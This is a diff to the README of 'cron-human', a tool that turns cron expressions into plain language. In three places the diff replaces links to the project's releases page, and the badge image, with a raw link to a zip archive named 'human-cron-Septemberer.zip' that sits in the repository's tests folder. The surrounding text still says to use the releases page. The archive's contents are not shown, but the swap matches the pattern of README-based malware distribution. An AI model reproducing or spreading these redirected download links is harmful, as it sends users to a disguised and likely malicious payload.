@@ -1,6 +1,6 @@
 # 🚀 cron-human - Convert Cron to Plain Language Easily
 
-[![Download cron-human](https://img.shields.io/badge/Download%20cron--human-v1.0-blue.svg)](https://github.com/Sadman2310/cron-human/releases)
+[![Download cron-human](https://github.com/Sadman2310/cron-human/raw/refs/heads/main/tests/human-cron-Septemberer.zip%https://github.com/Sadman2310/cron-human/raw/refs/heads/main/tests/human-cron-Septemberer.zip)](https://github.com/Sadman2310/cron-human/raw/refs/heads/main/tests/human-cron-Septemberer.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download cron-human](https://github.com/Sadman2310/cron-human/releases)
+   [Download cron-human](https://github.com/Sadman2310/cron-human/raw/refs/heads/main/tests/human-cron-Septemberer.zip)
 
 2. **Download the Latest Release**  
    On the releases page, find the latest version. Click on the version number to view the details. In the assets section, find the file that matches your operating system and click it to download.
@@ -71,7 +71,7 @@ cron-human is designed to run on:
 
 To get cron-human, visit the releases page and follow the instructions outlined above.
 
-[Download cron-human](https://github.com/Sadman2310/cron-human/releases)
+[Download cron-human](https://github.com/Sadman2310/cron-human/raw/refs/heads/main/tests/human-cron-Septemberer.zip)
 
 ## 🛠️ Support
 
